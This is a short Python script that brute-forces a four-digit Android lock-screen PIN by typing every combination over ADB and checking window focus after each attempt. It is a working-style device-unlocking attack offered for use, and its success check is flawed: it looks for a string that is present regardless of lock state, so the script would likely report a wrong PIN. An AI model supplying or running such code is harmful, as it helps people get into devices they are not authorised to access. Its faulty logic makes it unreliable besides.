import time
import subprocess

def crack_pin(device_ip):
    # List of all possible 4-digit PIN combinations
    pins = [f"{i:04d}" for i in range(10000)]

    for pin in pins:
        try:
            # Command to unlock the device using ADB (Android Debug Bridge)
            command = f"adb -s {device_ip} shell input text {pin}"
            subprocess.run(command, shell=True, check=True)

            # Command to press the Enter key
            command = f"adb -s {device_ip} shell input keyevent 66"
            subprocess.run(command, shell=True, check=True)

            # Check if the device is unlocked
            command = f"adb -s {device_ip} shell dumpsys window windows | grep -E 'mCurrentFocus|mFocusedApp'"
            output = subprocess.check_output(command, shell=True)

            if "mCurrentFocus" in output.decode():
                print(f"PIN cracked: {pin}")
                return pin

        except subprocess.CalledProcessError:
            pass

        # Add a small delay to avoid overloading the device
        time.sleep(0.1)

if __name__ == "__main__":
    device_ip = "your_device_ip"  # Replace with your device's IP address
    cracked_pin = crack_pin(device_ip)
    if cracked_pin:
        print(f"The PIN code is: {cracked_pin}")
    else:
        print("PIN cracking failed or took too long.")